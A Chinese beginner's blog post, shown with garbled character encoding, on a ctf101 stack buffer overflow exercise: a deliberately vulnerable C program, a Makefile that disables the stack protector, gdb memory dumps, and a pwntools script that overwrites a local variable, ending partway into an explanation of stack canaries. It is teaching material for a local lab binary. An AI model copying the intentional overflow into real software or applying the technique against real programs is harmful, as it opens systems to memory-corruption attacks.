<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="å‰è¨€ ç»è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼ˆç†è§£ä¸ºæµªè´¹æ—¶é—´å³å¯ï¼‰ï¼Œç»ˆäºèƒ½ç®€å•è¿‡ä¸ª pwn çš„ demo äº†ã€‚äºæ˜¯æ°´ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚ å‡†å¤‡ å»ºç«‹ä¸€ä¸ª pwn æ–‡ä»¶å¤¹åšå·¥ä½œåŒºï¼Œåˆå§‹åŒ–ä¸€ä¸ª python"><title>å…¥é—¨pwn</title>
<link rel=canonical href=https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/>
<link rel=stylesheet href=/blog/scss/style.min.8620c11ff935a5d342b5db4472643ebc0b4e9d20346a8730d3bf81e0b248f600.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale('zh-cn'),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="å…¥é—¨pwn">
<meta property="og:description" content="å‰è¨€ ç»è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼ˆç†è§£ä¸ºæµªè´¹æ—¶é—´å³å¯ï¼‰ï¼Œç»ˆäºèƒ½ç®€å•è¿‡ä¸ª pwn çš„ demo äº†ã€‚äºæ˜¯æ°´ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚ å‡†å¤‡ å»ºç«‹ä¸€ä¸ª pwn æ–‡ä»¶å¤¹åšå·¥ä½œåŒºï¼Œåˆå§‹åŒ–ä¸€ä¸ª python">
<meta property="og:url" content="https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/">
<meta property="og:site_name" content="weakptr's ç¬”è®°">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="pwn"><meta property="article:tag" content="security"><meta property="article:published_time" content="2022-08-18T17:52:00+08:00"><meta property="article:modified_time" content="2022-08-18T17:52:00+08:00">
<meta name=twitter:title content="å…¥é—¨pwn">
<meta name=twitter:description content="å‰è¨€ ç»è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼ˆç†è§£ä¸ºæµªè´¹æ—¶é—´å³å¯ï¼‰ï¼Œç»ˆäºèƒ½ç®€å•è¿‡ä¸ª pwn çš„ demo äº†ã€‚äºæ˜¯æ°´ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚ å‡†å¤‡ å»ºç«‹ä¸€ä¸ª pwn æ–‡ä»¶å¤¹åšå·¥ä½œåŒºï¼Œåˆå§‹åŒ–ä¸€ä¸ª python">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/blog>
<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>ğŸ‘</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/blog>weakptr's ç¬”è®°</a></h1>
<h2 class=site-description>å¼ƒèˆ¹ï¼</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>é¦–é¡µ</span>
</a>
</li>
<li>
<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>å…³äºæˆ‘</span>
</a>
</li>
<li>
<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>å½’æ¡£</span>
</a>
</li>
<li>
<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>åˆ†ç±»</span>
</a>
</li>
<li>
<a href=/blog/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>æ ‡ç­¾</span>
</a>
</li>
<li>
<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>å‹é“¾</span>
</a>
</li>
<li>
<a href=/blog/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>æœç´¢</span>
</a>
</li>
<div class=menu-bottom-section>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/blog/categories/pwn/>
pwn
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/blog/p/%E5%85%A5%E9%97%A8pwn/>å…¥é—¨pwn</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2022-08-18T17:52:00+08:00>2022å¹´ 8æœˆ 18æ—¥</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
é˜…è¯»æ—¶é•¿: 8 åˆ†é’Ÿ
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=å‰è¨€>å‰è¨€</h2>
<p>ç»è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼ˆç†è§£ä¸ºæµªè´¹æ—¶é—´å³å¯ï¼‰ï¼Œç»ˆäºèƒ½ç®€å•è¿‡ä¸ª pwn çš„ demo äº†ã€‚äºæ˜¯æ°´ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚</p>
<h2 id=å‡†å¤‡>å‡†å¤‡</h2>
<p>å»ºç«‹ä¸€ä¸ª pwn æ–‡ä»¶å¤¹åšå·¥ä½œåŒºï¼Œåˆå§‹åŒ–ä¸€ä¸ª python ç¯å¢ƒï¼Œè£…å¥½ <code>pwntools</code> ï¼Œè™½ç„¶è¿˜ä¸æ€ä¹ˆç”¨å¾—åˆ°ã€‚é¢˜ç›®æ¥æºæ˜¯ <a class=link href=https://ctf101.org/binary-exploitation/buffer-overflow/ target=_blank rel=noopener>ctf101 binary-exploitation buffer-overflow</a>ï¼Œæºç ç•¥åšä¿®æ”¹ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
  <span class=k>volatile</span> <span class=kt>int</span> <span class=n>secret</span> <span class=o>=</span> <span class=mh>0x12345678</span><span class=p>;</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>100</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;buffer: %p, secret: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>secret</span><span class=p>);</span>
  <span class=n>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>buffer</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span> <span class=c1>// ! dangerous !
</span><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>secret</span> <span class=o>==</span> <span class=mh>0x1234</span><span class=p>)</span> <span class=p>{</span>
    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;cool!&#34;</span><span class=p>);</span>
  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;that&#39;s not cool enough.&#34;</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ¼æ´è¡Œå·²ç»æ ‡æ³¨å‡ºã€‚é¢˜æ„æ¯”è¾ƒæ¸…æ¥šï¼Œé€šè¿‡ <code>read(0,buffer,0x100)</code> æº¢å‡ºè¦†å†™ <code>secret</code>ï¼Œæ¥é€šè¿‡åç»­çš„æ£€æŸ¥ã€‚<code>volatile</code>æ˜¯ä¸ºäº†é¿å…è¢«ä¼˜åŒ–æˆå¯„å­˜å™¨å˜é‡ï¼Œä¸è¿‡æŒ‡å®š <code>-O0</code> çš„æ—¶å€™åŠ ä¸åŠ <code>volatile</code>éƒ½æ— æ‰€è°“ã€‚</p>
<p>ç®€å•å†™ä¸ª <code>Makefile</code> ç¼–è¯‘å‡º 32 å’Œ 64 ä½ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¹‹åä¹Ÿä¼šå†™ä¸¤ä¸ª exp ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=nf>all</span><span class=o>:</span> <span class=n>question</span>32 <span class=n>question</span>64

<span class=nf>question32</span><span class=o>:</span> <span class=n>question</span>.<span class=n>c</span>
	gcc $^ -m32 -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question32

<span class=nf>question64</span><span class=o>:</span> <span class=n>question</span>.<span class=n>c</span>
	gcc $^ -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question64

</code></pre></td></tr></table>
</div>
</div><p>æ¯”è¾ƒé‡è¦çš„æ˜¯ <code>-fno-stack-protector</code>ï¼Œä¸åŠ çš„è¯ä¼šåœ¨æº¢å‡º <code>buffer</code> çš„æ—¶å€™è§¦å‘ stack canary æ£€æµ‹ï¼Œç›´æ¥æŠ¥ <code>stack smashing detected</code> åé€€å‡ºã€‚ä¸è¿‡ 32 ä½ä¼¼ä¹æ²¡è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>å†åˆ›å»º <code>exploit32.py</code>å’Œ<code>exploit64.py</code>ä¸¤ä¸ªæ–‡ä»¶ç”¨æ¥ä¿å­˜æˆ‘ä»¬çš„exploitè„šæœ¬ï¼Œå‡†å¤‡å·¥ä½œå°±ç®—ç»“æŸäº†ã€‚</p>
<h2 id=ç¼“å†²åŒºæº¢å‡º>ç¼“å†²åŒºæº¢å‡º</h2>
<h3 id=åŸç†>åŸç†</h3>
<p>å¼•ç”¨è‡ª <a class=link href=https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow target=_blank rel=noopener>ired.team binary exploitation</a> ï¼š</p>
<blockquote>
<p>At a high level, exploiting a buffer overflow boils down to the following key points:</p>
<ul>
<li>Attacker overflows vulnerable program&rsquo;s memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening;</li>
<li>When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker;</li>
<li>Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program&rsquo;s memory, when the program&rsquo;s memory buffer was overflowed;</li>
<li>The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.</li>
</ul>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯é€šè¿‡è¦†å†™å†…å­˜ï¼Œæ“çºµç¨‹åºçš„æ§åˆ¶æµï¼Œè¿è¡Œæ”»å‡»è€…çš„æ¶æ„ä»£ç æˆ–çªƒå–æ•°æ®ã€‚</p>
<h3 id=32ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º>32ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º</h3>
<p>åˆ†ææ¡ˆä¾‹ä»£ç ï¼Œ<code>buffer</code>å’Œ<code>secret</code>æ˜¯æ ˆä¸Šç›¸é‚»çš„å˜é‡ï¼Œä»å£°æ˜é¡ºåºç›²çŒœ<code>secret</code>åœ¨æ›´æ¥è¿‘æ ˆåº•çš„ä½ç½®ï¼ˆé«˜åœ°å€ï¼‰ï¼Œ<code>buffer</code>åœ¨æ›´æ¥è¿‘æ ˆé¡¶çš„ä½ç½®ï¼ˆä½åœ°å€ï¼‰ã€‚x86ä½“ç³»ç»“æ„ä¸‹æ ˆä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼Œ<code>&buffer[0]</code>æ˜¯æ ˆé¡¶ï¼Œåˆ™<code>&buffer[100]</code>å°±æ˜¯<code>secret</code>çš„åœ°å€äº†ã€‚</p>
<p><img src=/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747.png width=269 height=295 srcset="/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_480x0_resize_box_3.png 480w, /blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220815163807747 class=gallery-image data-flex-grow=91 data-flex-basis=218px></p>
<p><code>read(STDIN_FILENO, buffer, 0x100)</code> ä»æ ‡å‡†è¾“å…¥è¯»å– <code>0x100</code> ä¸ªå­—èŠ‚ï¼Œä» <code>&buffer[0]</code> å¼€å§‹å†™å…¥ã€‚å› ä¸ºè¾¹ç•Œæ£€æŸ¥å¤±æ•ˆï¼ˆå†™å…¥é•¿åº¦<code>0x100</code>å¤§äº<code>buffer[100]</code>é•¿åº¦ï¼‰ï¼Œåªè¦æˆ‘ä»¬æä¾› <code>104</code> ä¸ªå­—èŠ‚çš„è¾“å…¥ï¼Œæœ€åå››ä¸ªå­—èŠ‚å°±ä¼šè¦†ç›– <code>secret</code> å˜é‡çš„å€¼ã€‚</p>
<p>ä¸ºäº†éªŒè¯ä¸Šé¢çš„è¯´æ³•ï¼Œå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ª payload æ–‡ä»¶ä½œä¸º <code>question32</code> çš„è¾“å…¥ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;payload32.bin&#39;</span><span class=p>,</span><span class=s1>&#39;wb+&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x41</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>104</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥ä½¿ç”¨ gdb è§‚å¯Ÿè¯»å–è¾“å…¥å‰åçš„æ ˆæ•°æ®ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>Reading symbols from question32...
(gdb) b question.c:8
Breakpoint 1 at 0x1214: file question.c, line 8.
(gdb) b question.c:9
Breakpoint 2 at 0x122a: file question.c, line 9.
(gdb) r &lt; payload32.bin
Starting program: /home/weakptr/repos/pwn/lab-1/question32 &lt; payload32.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
buffer: 0xffffd058, secret: 0xffffd0bc

Breakpoint 1, main () at question.c:8
8         read(STDIN_FILENO, buffer, 0x100);
(gdb) x/32x $esp
0xffffd050:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd060:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd070:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd090:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd0a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd0b0:     0x00000000      0x00000000      0x00000000      *0x12345678*
0xffffd0c0:     0xffffd100      0xf7fbe66c      0xf7fbeb20      0xffffd0f0
(gdb)
</code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿç¬¬ 21 è¡Œï¼Œ<code>0xffffd0bc</code> å¤„ï¼Œ<code>0x12345678</code>ï¼Œå°±æ˜¯ <code>question.c</code> ä¸­åˆå§‹åŒ–çš„ <code>secret</code> äº†ã€‚è€Œä» <code>0xffffd0508</code>åˆ°<code>0xffffd0bc</code>å°±æ˜¯<code>buffer</code>çš„å†…å®¹ã€‚</p>
<p>æˆ‘ä»¬ç»§ç»­æ‰§è¡Œåˆ° <code>read</code> è¿™ä¸€è¡Œåã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(gdb) next

Breakpoint 2, main () at question.c:9
9         if (secret == 0x1234) {
(gdb) x/32x $esp
0xffffd050:     0x00000000      0x00000000      0x41414141      0x41414141
0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd080:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd090:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd0b0:     0x41414141      0x41414141      0x41414141      *0x41414141*
0xffffd0c0:     0xffffd100      0xf7fbe66c      0xf7fbeb20      0xffffd0f0
(gdb) p /x secret
$2 = 0x41414141
</code></pre></td></tr></table>
</div>
</div><p>è§‚å¯Ÿåˆ° <code>secret</code> è¢«è¦†ç›–ä¸º <code>0x41414141</code>ã€‚</p>
<p>ç°åœ¨åªéœ€è¦æŠŠ payload32.bin ä¸­æœ€åå››ä¸ªå­—èŠ‚æ”¹æˆé¢„æœŸçš„ <code>secret</code> å€¼ <code>0x1234</code> å³å¯ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>proc</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./question32&#39;</span><span class=p>)</span>
<span class=n>b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;@l&#39;</span><span class=p>,</span> <span class=mh>0x1234</span><span class=p>)</span>
<span class=n>proc</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x41</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>100</span> <span class=o>+</span> <span class=n>b</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>

</code></pre></td></tr></table>
</div>
</div><p>ç»“æœï¼š</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-1 Â» python exploit32.py
[+] Starting local process &#39;./question32&#39;: pid 640653
[*] Process &#39;./question32&#39; stopped with exit code 0 (pid 640653)
buffer: 0xffc0bf88, secret: 0xffc0bfec
cool!

</code></pre></td></tr></table>
</div>
</div><h3 id=64ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º>64ä½æ ˆä¸Šç¼“å†²åŒºæº¢å‡º</h3>
<p>x86-64æ¶æ„ä¸‹çš„æ ˆä¸Šç¼“å†²åŒºæº¢å‡ºå’Œ 32 ä½æ¶æ„æœ‰æ‰€ä¸åŒï¼Œä¸»è¦åŒºåˆ«åœ¨äº 64ä½ ELF å¤šäº†å¾ˆå¤šä¿æŠ¤æœºåˆ¶ï¼Œç›´æ¥å½±å“æ ˆä¸Šç¼“å†²åŒºæº¢å‡ºçš„å°±æœ‰ stack canaryã€‚</p>
<h4 id=stack-canary>stack canary</h4>
<p>å…³äº stack canary æœºåˆ¶çš„è§£é‡Šæ‘˜å½•å¦‚ä¸‹ã€‚</p>
<blockquote>
<p>Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.</p>
</blockquote>
<p>å°è¯•è®© gcc åå‡ºå¸¦ canary çš„æ±‡ç¼–å¦‚ä¸‹ï¼Œå‘½ä»¤ <code>gcc -S question.c -g -O0 -fstack-protector -o question64.s</code></p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>main:
	endbr64
	pushq	%rbp
	movq	%rsp, %rbp
	addq	$-128, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$305419896, -116(%rbp)
	movq	$0, -112(%rbp)
	movq	$0, -104(%rbp)
	movq	$0, -96(%rbp)
	movq	$0, -88(%rbp)
	// ç•¥
    movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L5
	call	__stack_chk_fail@PLT
.L5:
	leave
	ret
</code></pre></td></tr></table>
</div>
</div><p>åœ¨å‡½æ•°åºè¨€éƒ¨åˆ†å¤šå‡ºäº†å‡ æ¡æŒ‡ä»¤ï¼š</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
</code></pre></td></tr></table>
</div>
